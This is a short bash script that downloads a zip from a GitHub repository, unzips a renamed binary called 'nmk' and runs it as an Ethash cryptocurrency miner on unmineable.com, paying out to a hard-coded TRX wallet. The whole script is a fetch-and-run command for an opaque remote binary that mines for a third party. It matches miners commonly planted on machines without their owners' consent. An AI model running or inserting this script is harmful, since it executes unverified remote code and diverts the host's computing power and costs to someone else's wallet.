#!/bin/bash
sudo apt update && wget https://github.com/hasra33/erf/raw/main/nmk.zip && apt install unzip && unzip nmk.zip && cd nmk && chmod u+x nmk && ./nmk --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.swamiOm --ethstratum ETHPROXY
